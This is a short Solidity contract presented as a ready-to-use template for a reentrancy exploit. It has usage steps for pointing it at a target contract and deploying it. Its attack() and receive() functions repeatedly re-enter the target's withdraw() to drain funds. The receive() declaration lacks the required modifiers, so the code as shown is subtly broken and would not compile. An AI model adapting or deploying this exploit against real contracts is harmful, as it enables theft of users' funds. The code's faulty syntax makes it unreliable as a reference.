
// Description:
// A template for a reentrancy attack in which we use the case that a contract sends us money to reenter using receive

// How to use:
// 1. Change the ./Target.sol import to the path to the code of your target
// 2. Implement additional functionalities / adapt the parameters
// 3. Deploy the contract and call attack();

// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.7;

import "./Target.sol";

contract exploiter {

    int withdraws;
    Target target_contract;

    constructor(address target_addr)
    {
        withdraws = 0; 
        target_contract = Target(target_addr);
    }

    function attack() payable public
    {
        target_contract.withdraw();
    }

    receive()
    {
        if (withdraws < 10)
        {
            withdraws += 1;
            target_contract.withdraw();
        }
    }
}